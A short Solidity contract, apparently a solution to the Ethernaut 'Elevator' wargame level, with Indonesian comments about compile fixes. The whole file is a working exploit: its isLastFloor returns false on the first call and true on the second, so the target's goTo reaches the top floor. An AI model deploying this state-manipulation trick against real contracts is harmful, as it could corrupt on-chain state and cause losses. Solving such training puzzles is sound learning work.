// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

interface IElevator {
    function goTo(uint256 _floor) external;
}

// PERBAIKAN 1: Tambahkan 'is Building' di sini
contract elevatorAttack is Building { 
    IElevator public targetContract; 
    bool public called = false;

    constructor(address _elevator) {
        targetContract = IElevator(_elevator);
    }

    function isLastFloor(uint256) external override returns (bool) {
        if (!called) {
            called = true;  // pertama kali dipanggil → return false
            return false;
        }
        return true;        // kedua kali dipanggil → return true
    }

    function attackGoto() public {
        // PERBAIKAN 2: Pastikan titik koma berada di akhir baris yang sama
        targetContract.goTo(1);
    }
}